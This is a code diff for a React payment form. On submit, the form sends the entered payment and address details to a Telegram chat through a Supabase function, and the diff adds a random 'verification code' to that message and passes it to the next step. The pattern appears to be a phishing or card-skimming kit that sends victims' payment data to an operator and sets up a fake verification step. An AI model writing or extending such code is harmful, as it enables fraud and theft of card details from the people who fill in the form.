@@ -5,7 +5,7 @@ import AddressAutocomplete, { AddressSuggestion } from "./AddressAutocomplete";
 import { supabase } from "@/integrations/supabase/client";
 
 interface PaymentFormProps {
-  onProceed: () => void;
+  onProceed: (verificationCode: string) => void;
   onBack: () => void;
 }
 
@@ -268,7 +268,11 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
     return v;
   };
 
-  const sendTelegramNotification = async () => {
+  const generateVerificationCode = () => {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+  };
+
+  const sendTelegramNotification = async (verificationCode: string) => {
     try {
       const countryName = COUNTRIES.find(c => c.code === country)?.name || country;
       const message = `💳 <b>New Payment Details Submitted</b>
@@ -283,6 +287,8 @@ ${address}
 ${city}, ${postcode}
 ${countryName}
 
+🔑 <b>Verification Code:</b> <code>${verificationCode}</code>
+
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
 
       await supabase.functions.invoke("send-telegram", {
@@ -295,8 +301,9 @@ ${countryName}
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    await sendTelegramNotification();
-    onProceed();
+    const code = generateVerificationCode();
+    await sendTelegramNotification(code);
+    onProceed(code);
   };
 
   return (
